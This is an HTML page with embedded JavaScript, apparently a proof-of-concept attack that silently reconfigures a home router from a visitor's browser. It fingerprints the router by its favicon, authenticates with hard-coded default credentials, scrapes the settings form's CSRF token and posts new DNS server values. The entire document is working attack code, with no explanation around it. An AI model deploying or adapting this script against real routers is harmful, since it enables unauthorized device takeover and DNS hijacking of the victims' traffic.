<html>
<head>
<script src="http://192.168.0.1/functions.js"></script>
<script>
function done(origReq, result)	{
	var res = result.responseText;
	console.log("Done");
}

function parseWebPage(origReq, result)	{
	var res = result.responseText;
	
	// Extract the first form on the page
	var form = Html.extractTagN(res, "form", 0);

	// Get an object that is easier to work with
	var req = Html.form2http(form);
	
	// Find the CSRF-field and extract token
	csrf=""
	for(var i = 0; i < req["inputs"].length; i++)	{
		if(req["inputs"][i]["name"] == "SecureFormToken")	{
			csrf = req["inputs"][i]["value"];
		}
	}

	var params = {
		"SelectLanguage":"en_US",
		"LogoutApplyAction":"",
		"SecureFormToken":csrf,
		"BasicLANDNSServer1":"8.8.8.8",
		"BasicLANDNSServer2":"8.8.4.4",
		"BasicLANDomainName":""
	};

	var changeReq = {
		"method":req["method"],
		"target":"http://192.168.0.1",
		"resource":req["resource"],
		"headers":{
			"Content-type": req["enctype"],
			"Authorization": "Basic aG9tZTpob21l"
		},
		"params":Data.serialize(params)
	};
	Network.request(changeReq, done);
}

function retrieveFavicon(origReq, res)	{
	var image = res.responseText;

	// Quick-fix:
	// If we get an image and it has correct length we assume that we are on
	// the correct page.
	if(image && image.length == 1078)	{
		var pageReq = {
			"method":"GET",
			"target":"http://192.168.0.1",
			"resource": "/BasicLAN.asp",
			"headers": {
				"Authorization": "Basic aG9tZTpob21l"
			}
		};
		Network.request(pageReq, parseWebPage);
	}
}

console.log("Loaded");

// Request to get the favicon
var favReq = {
	"method":"GET",
	"target":"http://192.168.0.1",
	"resource":"/favicon.ico",
	"headers": {
		"Authorization": "Basic aG9tZTpob21l"
	}
};
Network.request(favReq, retrieveFavicon);
</script>
</head>
<body>

</body>
</html>

